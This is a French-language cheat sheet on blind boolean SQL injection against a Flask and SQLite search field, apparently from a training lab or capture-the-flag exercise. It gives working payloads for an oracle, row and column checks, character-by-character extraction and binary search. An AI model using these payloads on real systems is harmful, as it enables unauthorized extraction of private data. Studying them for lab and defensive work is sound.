# SQLi Blind SQLite — Fiche mémo

## Quand y penser

Signaux typiques :
- application Flask + SQLite ;
- champ de recherche ;
- `'` provoque une réponse différente (`Requête invalide`) ;
- certaines syntaxes SQL passent, d’autres sont filtrées ;
- aucune donnée SQL n’est affichée directement ;
- on peut quand même faire varier un résultat visible.

## Oracle booléen

```sql
' || CASE WHEN (<condition>) THEN 'stagiaire' ELSE 'zzzzzz' END || '
```

- condition vraie → résultat connu (`Bienvenue stagiaire`)
- condition fausse → aucun résultat

## Vérifier qu’une ligne existe

```sql
' || CASE WHEN (SELECT id FROM notes WHERE id=4)=4
THEN 'stagiaire' ELSE 'zzzzzz' END || '
```

## Vérifier qu’une colonne existe

```sql
' || CASE WHEN (SELECT body FROM notes WHERE id=4) IS NOT NULL
THEN 'stagiaire' ELSE 'zzzzzz' END || '
```

## Extraire un caractère

```sql
unicode(substr((SELECT body FROM notes WHERE id=4),1,1)) > 77
```

Dans l’oracle :

```sql
' || CASE WHEN unicode(substr((SELECT body FROM notes WHERE id=4),1,1))>77
THEN 'stagiaire' ELSE 'zzzzzz' END || '
```

## Recherche binaire

Pour un caractère ASCII imprimable :
1. tester `> milieu` ;
2. garder la bonne moitié ;
3. recommencer ;
4. finir avec `= valeur`.

Environ 7 requêtes max par caractère.

## Tester un mot entier

Quand un préfixe devient probable :

```sql
substr((SELECT body FROM notes WHERE id=4),1,9)='Le coffre'
```

Oracle complet :

```sql
' || CASE WHEN substr((SELECT body FROM notes WHERE id=4),1,9)='Le coffre'
THEN 'stagiaire' ELSE 'zzzzzz' END || '
```

## Fonctions SQLite utiles

```sql
substr(texte, position, longueur)
length(texte)
unicode(caractere)
CASE WHEN condition THEN valeur1 ELSE valeur2 END
```

## Concaténation SQLite

```sql
||
```

Exemple :

```sql
'abc' || 'def'
```

→ `abcdef`

## Erreurs fréquentes

- Utiliser `information_schema` sur SQLite.
- Utiliser des fonctions MySQL par réflexe.
- Penser que `1/0` provoque forcément une erreur : SQLite retourne souvent `NULL`.
- Prendre un `200 OK` pour une preuve que l’injection a fonctionné.
- Ne pas comparer une condition vraie et une fausse.
- Oublier les accents : `è` a un code Unicode bien supérieur à l’ASCII classique.
